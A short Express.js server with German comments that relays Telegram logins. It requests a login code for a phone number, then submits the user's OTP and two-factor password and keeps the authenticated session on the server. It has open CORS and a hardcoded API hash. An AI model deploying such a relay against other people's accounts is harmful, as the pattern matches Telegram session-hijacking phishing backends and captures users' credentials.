const express = require('express');
const cors = require('cors');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({ origin: '*' }));
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';
const activeSessions = new Map();

app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        
        const result = await client.sendCode({ apiId, apiHash }, phone);
        activeSessions.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
        res.json({ phoneCodeHash: result.phoneCodeHash });
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, phoneCodeHash, password } = req.body;
        const session = activeSessions.get(phone);
        if (!session) return res.status(400).json({ error: "Session abgelaufen" });

        try {
            // Erstversuch: OTP Verifizierung
            await session.client.invoke(new Api.auth.SignIn({
                phoneNumber: phone,
                phoneCode: code,
                phoneCodeHash: phoneCodeHash
            }));
            res.json({ success: true });
        } catch (err) {
            // Prüfen, ob 2FA Passwort benötigt wird
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                if (!password) {
                    // Frontend muss jetzt Passwort abfragen
                    return res.json({ twoFactorRequired: true });
                }
                
                // Passwort verifizieren mittels SRP
                const pwd = await session.client.invoke(new Api.account.GetPassword());
                await session.client.invoke(new Api.auth.CheckPassword({
                    password: await session.client.srpSolve(pwd, password)
                }));
                
                res.json({ success: true });
            } else {
                throw err;
            }
        }
    } catch (e) {
        res.status(400).json({ error: e.message });
    }
});

app.listen(PORT, () => console.log(`Server läuft auf Port ${PORT}`));
